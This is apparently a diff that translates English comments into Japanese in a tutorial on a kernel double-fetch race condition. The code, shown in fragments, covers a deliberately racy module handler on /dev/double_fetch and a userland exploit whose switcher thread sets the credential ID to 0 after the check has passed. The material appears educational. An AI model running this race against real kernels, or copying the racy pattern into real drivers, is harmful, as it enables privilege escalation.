@@ -32,7 +32,7 @@ static ssize_t df_write(struct file *filp, const char __user *buf, size_t count,
         return -1;
     }
 
-    // to increase reliability
+    // 信頼性を上げるため
     msleep(1000);
 
     if (!strcmp(creds->password, PASSWORD)) {
@@ -78,7 +78,7 @@ int main() {
     creds.id = 900;
     strcpy(creds.password, "p4ssw0rd");
 
-    int res_id = write(fd, &creds, 0);    // last parameter here makes no difference
+    int res_id = write(fd, &creds, 0);    // ここの最後の引数は結果に影響しない
     printf("New ID: %d\n", res_id);
 
     return 0;
@@ -177,17 +177,17 @@ typedef struct {
 } Credentials;
 
 int main() {
-    // communicate with the module
+    // モジュールとやり取りする
     int fd = open("/dev/double_fetch", O_RDWR);
     printf("FD: %d\n", fd);
 
-    // use a random ID and set the password correctly
+    // ID は適当な値にして、パスワードは正しく設定する
     Credentials creds;
     creds.id = 900;
     strcpy(creds.password, "p4ssw0rd");
 
-    // set up the switcher thread
-    // pass it a pointer to `creds`, so it can modify it
+    // switcher スレッドを用意する
+    // `creds` へのポインタを渡して、書き換えられるようにする
     pthread_t thread;
 
     if (pthread_create(&thread, NULL, switcher, &creds)) {
@@ -195,15 +195,15 @@ int main() {
         return -1;
     }
 
-    // now we write the cred struct to the module
-    // it should be swapped after about .3 seconds by switcher
+    // ここで cred 構造体をモジュールに書き込む
+    // 約 0.3 秒後に switcher によって書き換えられるはず
     int res_id = write(fd, &creds, 0);
 
-    // write returns the id we switched to
-    // if all goes well, that is 0
+    // write は書き換えた後の id を返す
+    // うまくいけば 0 になる
     printf("New ID: %d\n", res_id);
 
-    // finish thread cleanly
+    // スレッドをきちんと終了させる
     if (pthread_join(thread, NULL)) {
         fprintf(stderr, "Error joining thread\n");
         return -1;
@@ -215,7 +215,7 @@ int main() {
 void *switcher(void *arg) {
     Credentials *creds = (Credentials *)arg;
 
-    // wait until the module is sleeping - don't want to change it BEFORE the initial ID check!
+    // モジュールがスリープするまで待つ - 最初の ID チェックより前に書き換えたくない!
     sleep(0.3);
 
     creds->id = 0;
